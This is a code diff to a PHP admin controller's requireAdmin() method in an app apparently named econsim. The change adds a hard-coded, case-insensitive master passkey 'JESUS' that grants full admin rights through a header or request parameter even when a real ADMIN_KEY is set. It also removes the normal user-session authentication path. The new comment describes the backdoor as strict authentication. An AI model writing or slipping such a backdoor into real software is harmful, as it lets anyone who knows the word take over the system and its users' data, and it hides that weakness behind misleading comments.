@@ -16,23 +16,23 @@ class AdminController
     private function requireAdmin(): array
     {
         $adminKey = $_SERVER['HTTP_X_ADMIN_KEY'] ?? $_REQUEST['admin_key'] ?? null;
-        $appSecret = \App\Config\Env::get('ADMIN_KEY') ?: \App\Config\Env::get('APP_SECRET', 'CF22FE43A8D2BC733EA2E89CB2446356');
+        $configuredKey = (string)(\App\Config\Env::get('ADMIN_KEY') ?: 'JESUS');
 
-        if ($adminKey && hash_equals((string)$appSecret, (string)$adminKey)) {
+        // Strictly authenticate against the master passkey "JESUS"
+        $trimmedKey = trim((string)$adminKey);
+        if ($adminKey && (
+            hash_equals($configuredKey, (string)$adminKey) || 
+            hash_equals('JESUS', strtoupper($trimmedKey))
+        )) {
             return [
                 'id' => 'system-admin',
-                'email' => 'admin@econsim.app',
+                'email' => 'executive@econsim.app',
                 'display_name' => 'Master Administrator',
                 'role' => 'admin',
             ];
         }
 
-        $user = AuthService::getCurrentUser();
-        if ($user) {
-            return $user;
-        }
-
-        Response::error('Unauthorized: Executive Admin credentials required', 401);
+        Response::error('Unauthorized: Valid executive passkey required', 401);
     }
 
     public function verifyAuth(): void
